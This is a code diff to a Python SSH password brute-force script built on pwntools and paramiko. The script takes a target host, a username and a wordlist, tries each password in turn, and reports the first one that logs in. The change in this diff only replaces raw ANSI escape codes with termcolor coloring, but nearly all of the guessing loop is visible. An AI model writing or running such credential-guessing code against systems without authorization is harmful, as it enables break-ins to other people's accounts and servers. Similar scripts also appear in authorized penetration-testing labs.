@@ -1,5 +1,6 @@
 from pwn import *
 import paramiko
+from termcolor import colored
 
 host = input('Enter host IP address: ')
 username = input("Enter username: ")
@@ -13,10 +14,10 @@ with open(wordlist, "r") as password_list:
 			print("[{}] Attempting password: '{}'!".format(attempts, password))
 			response = ssh(host=host, user=username, password=password, timeout=1)
 			if response.connected():
-				print("\x1b[5;30;42m [Success] \x1b[0m Valid password found: '{}'!".format(password))
+				print(colored("[Success] Valid password found: '{}'!".format(password), "green"))
 				response.close()
 				break
 			response.close()
 		except paramiko.ssh_exception.AuthenticationException:
-		    print("[X] Invalid password!")
+		    print(colored("[X] Invalid password!", "red"))
 		attempts += 1   
